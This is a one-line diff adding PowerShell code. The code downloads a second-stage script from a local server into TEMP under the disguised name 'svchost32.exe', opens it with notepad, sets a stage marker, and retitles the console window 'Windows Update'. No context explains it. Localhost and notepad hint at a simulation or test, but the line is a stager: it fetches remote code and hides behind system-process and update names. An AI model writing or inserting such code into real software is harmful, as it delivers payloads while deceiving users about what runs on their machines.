@@ -1,0 +1,1 @@
+$PayloadUrl = "http://localhost:8081/stage2.ps1"; $WorkingPath = "$env:TEMP\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $WorkingPath); Start-Process -FilePath "notepad.exe" -ArgumentList $WorkingPath; $StageMarker = "stage-12"; $Host.UI.RawUI.WindowTitle = "Windows Update"
